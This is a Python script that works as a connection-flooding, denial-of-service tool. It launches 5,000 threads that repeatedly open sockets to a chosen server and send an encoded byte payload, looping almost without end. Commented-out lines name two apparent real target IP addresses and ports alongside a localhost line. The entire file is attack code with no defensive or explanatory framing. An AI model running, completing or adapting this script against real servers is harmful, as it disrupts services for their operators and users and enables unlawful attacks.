import socket,time
import threading
import time
global is_start,a
is_start=0
a=[-27, 0, 0, -109, 105, 81, 99, 118, 97, 112, 105, 114, 96, -113, 101, 112, 104, 124, 97, 117, 101, 99, 40, 28, 5, 6, 10, 25, 13, 54, 4, 2, 12, 19, 12, 14, 83, 90, 87, 94, 89, 12, 97, 103, 101, 97, 10, 29, 12, 90, 11, 23, 6, 17, 19, 27, 11, 23, 71, 25, 0, 29, 10, -31, 105, 112, 97, 116, -122, 112, 126, 114, 97, 113, 4, 20, 4, 27, 15, 116, 96, 29, 12, 31, 0, 13, 101, 117, 91, 92, 83, 90, 85, 112, -115, 114, 96, 124, -127, 112, 104, 122, -74, 116, 100, 113, 23, 114, 114, 116, 116, 19, 6, 31, 79, 26, 2, 31, 10, 0, 14, 26, 2, 94, 2, 19, 8, 27, 71, 112, 107, 114, 99, -112, 101, 114, 99, 119, -93, 116, 100, 112, -85, 114, 96, 124, -89, 112, 104, 117, -93, 116, 100, 118, -85, 114, 96, 113, -89, 112, 104, 118, -93, 116, 100, 115, -85, 114, 96, 118, -89, 112, 104, 115, -93, 116, 100, 98, -85, 114, 96, 101, -89, 112, 104, 98, -93, 116, 100, 127, -85, 114, 96, 122, -89, 112, 104, 127, -93, 116, 100, 124, -85, 114, 96, 127, -89, 112, 104, 120, -93, 116, 100, 121, -85, 114, 96, 111, -89, 112, 104, 104, -93, 116, 100, 105, -85, 114, 96, 108, -89, 112, 104, 101, -93, 116, 100, 84, -85, 114, 96, 87, -89, 112, 104, 80, -93, 116, 100, 81, -85, 114, 96, 84, -89, 112, 104, 97, -93, 116, 100, 102, -85, 114, 96, 97, -89, 112, 104, 102, -93, 116, 100, 109, -115, 114, 96, 121, -127, 112, 104, 127, 106, 116, 100, 125, -119, 114, 99, 116, 108, -112, 105, 112, 97, 115, -123, 112, 107, 114, 101, -108, 101, 114, 105, 120, -127, 116, 103, 112, 98, -110, 97, 118, 101, 113, -119, 114, 99, 116, 99, -112, 105, 112, 97, 20, -123, 112, 107, 114, -18, -108, 101, 114, 105, 32, -33, 116, 103, 112, 109, -85, 97, 116, -16, 112, 105, -49, 97, 112, 101, 112, 98, -62, -36, 116, 97, 112, 105, 121, -22, -55, 101, 116, 105, 114, 97, 116, -40, 112, 109, 114, 97, 113, 18, -51, 105, 118, 97, 116, 76, 0, -44, 114, 101, 116, 101, 107, 32, -49, 97, 112, 101, 112, 114, 46, -36, 116, 97, 112, 105, 105, 45, -55, 101, 116, 105, 114, 99, 111, -40, 112, 109, 114, 97, 122, -89, -51, 105, 118, 97, 116, 110, -33, -44, 114, 101, 116, 101, 123, -57, -49, 97, 112, 101, 112, 108, 11, -36, 116, 97, 112, 105, 119, 25, -55, 101, 116, 105, 114, 72, 5, -40, 112, 109, 114, 97, 111, 13, -51, 105, 118, 97, 116, 112, 67, -44, 114, 101, 116, 101, 114, 94, -49, 97, 112, 101, 112, 107, 75, -36, 116, 97, 112, 105, 112, 89, -55, 101, 116, 105, 114, 99, -91, -40, 112, 109, 114, 97, 118, -86, -95, 105, 112, 97, 116, -40, 112, 109, 114, 97, 119, -65, -51, 105, 118, 97, 116, 102, -95, -44, 114, 101, 116, 101, 115, -69, -49, 97, 112, 101, 112, 114, 56, -36, 116, 97, 112, 105, 105, 1, -55, 101, 116, 105, 114, 122, 36, -40, 112, 109, 114, 97, 112, 21, -51, 105, 118, 97, 116, 97, 1, -44, 114, 101, 116, 101, 107, 8, -49, 97, 112, 101, 112, 114, 35, -36, 116, 97, 112, 105, 118, 19, -55, 101, 116, 105, 114, 101, 27, -40, 112, 109, 114, 97, 111, 56, -51, 105, 118, 97, 116, 126, 61, -44, 114, 101, 116, 101, 107, 55, -49, 97, 112, 101, 112, 114, 60, -36, 116, 97, 112, 105, 105, 62, -55, 101, 116, 105, 114, 122, 59, -100, 112, 106, 114, 98, 7, -100, 112, 106, 114, 98, 95, -100, 112, 106, 114, 98, 105, -100, 112, 106, 115, 99, -111, -40, 112, 109, 114, 97, 111, 7, -51, 105, 118, 97, 116, 126, 34, -44, 114, 101, 116, 101, 107, 50, -49, 97, 112, 101, 112, 108, 46, -104, 116, 96, 113, 107, -57, 96, -12, -40, 112, 109, 114, 97, 113, 56, -51, 105, 118, 97, 116, 96, 47, -44, 114, 101, 116, 101, 117, 55, -49, 97, 112, 101, 112, 108, 18, -104, 116, 102, 112, 107, 23, -104, 116, 102, 112, 107, 74, -36, 116, 97, 112, 105, 105, 5, -55, 101, 116, 105, 114, 122, 45, -40, 112, 109, 114, 97, 111, 63, -51, 105, 118, 97, 116, 126, 21, -44, 114, 101, 116, 101, 107, 62, 68, 97, 117, 100, -51, 105, 118, 97, 116, 126, 40, -44, 114, 101, 116, 101, 107, 61, 68, 97, 117, 100, -51, 105, 118, 97, 116, 126, 22, -112, 114, 98, 116, 103, 84, -44, 114, 101, 116, 101, 88, -114, -49, 97, 112, 101, 112, 65, -101, -36, 116, 97, 112, 105, 90, -119, 66, 101, 113, 104, -49, 97, 112, 101, 112, 114, 57, -36, 116, 97, 112, 105, 113, -82, -115, 101, 115, 105, 115, -118, -115, 101, 117, 104, 115, -118, 117, 2, -119, 105, 119, 96, 117, -114, 113, 39, -117, 97, 113, 100, 113, -126, 115, 84, -115, 101, 117, 105, 115, -46, 117, 69, -119, 105, 113, 97, 117, 14, -119, 105, 113, 97, 117, 83, -51, 105, 118, 97, 116, 66, -71, -44, 114, 101, 116, 101, 87, -93, -49, 97, 112, 101, 112, 78, -66, -36, 116, 97, 112, 105, 85, -86, -55, 101, 116, 105, 114, 70, -71, -40, 112, 109, 114, 97, 96, 112, -51, 105, 118, 97, 116, 76, 27, -112, 114, 98, 116, 101, -98, -112, 114, 98, 116, 101, -42, -112, 114, 98, 116, 101, 7, -112, 114, 98, 116, 101, 47, -112, 114, 98, 116, 101, 103, -128, 114, 97, -112, 101, 114, 99, 118, 106, 116, 100, 116, 98, 114, 96, 115, 110, 112, 104, 120, -127, 116, 103, 112, 102, -110, 97, 118, 101, -16, -41, 114, 99, 116, 101, -50, 105, 112, 97, 125, -68, 112, 105, -117, 97, 119, 101, 117, -75, -117, 97, 119, 101, 117, -3, -117, 97, 119, 101, 117, 37, -117, 97, 119, 101, 117, -3, -117, 97, 119, 101, 117, -75, -117, 97, 119, 101, 118, 75, -117, 97, 119, 101, 118, 35, -101, 97, 116, -127, 112, 107, 120, 100, 127, 101, 113, 100, -110, 97, 118, 101, 121, -119, 114, 99, 116, 97, -112, 105, 112, 97, 126, -123, 112, 107, 114, 106, -108, 101, 114, 105, 115, -127, 116, 103, 112, 111, -110, 97, 118, 101, 16, -119, 114, 99, 116, -22, -112, 105, 112, 97, 38, -37, 112, 107, 114, 101, -83, 101, 112, -44, 114, 101, 116, 101, 89, 3, -49, 97, 112, 101, 112, 120, 35, -36, 116, 97, 112, 105, 125, 89, -55, 101, 116, 105, 114, 100, -2, -40, 112, 109, 114, 97, 116, -108, -51, 105, 118, 97, 116, 96, -7, -44, 114, 101, 116, 101, 117, -31, -49, 97, 112, 101, 112, 108, -7, -36, 116, 97, 112, 105, 119, -19, -95, 101, 115, 105, 115, 96, -47, 101, 113, 105, -106, 97, 118, 111, 102, -73, 114, 96, 118, -123, 112, 107, 114, 123, -108, 101, 114, 105, 43, -127, 116, 103, 112, 123, -110, 97, 118, 101, 97, -119, 114, 99, 116, 118, -112, 105, 112, 97, 99, -123, 112, 107, 114, 121, -108, 101, 114, 105, 102, -127, 116, 103, 112, 124, -110, 97, 118, 101, -16, -41, 114, 99, 116, 99, -50, 105, 112, 97, 116, -68, 112, 105, -117, 97, 113, 101, 114, 109, 115, 49, -55, 101, 116, 105, 114, 96, 125, -40, 112, 109, 114, 97, 116, 49, -51, 105, 118, 97, 116, 102, -86, -44, 114, 101, 116, 101, 115, -72, -49, 97, 112, 101, 112, 106, -96, -36, 116, 97, 112, 105, 91, 16]
def twoscomplement_to_unsigned(i):
    return i % 256
def start():
    global is_start,a
    while is_start==0:
        time.sleep(2)
    for i in range(0,999999999,1):
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # vocuc
            #server_socket.connect(("14.225.255.184", 20000))
            # iaki
            #server_socket.connect(("51.79.156.137", 14446))
            #server_socket.connect(("127.0.0.1", 14445))
            for b in a:
                server_socket.send(b)
            time.sleep(1.5)
        except KeyboardInterrupt:
            exit()
        except TimeoutError:
            print('timeout: {}'.format(i))
            pass
        except ConnectionRefusedError:
            print('refused: {}'.format(i))
            pass
        except:
            pass
        try:
            server_socket.close()
        except:
            continue
for _ in range(0,len(a),1):
    i=[]
    i.append(a[_])
    a[_]=bytes(map(twoscomplement_to_unsigned, i))
for _ in range(0,5000,1):
    print('thread '+str(_))
    threading.Thread(target=start, args=()).start()
while 1:
    is_start=1
    time.sleep(100)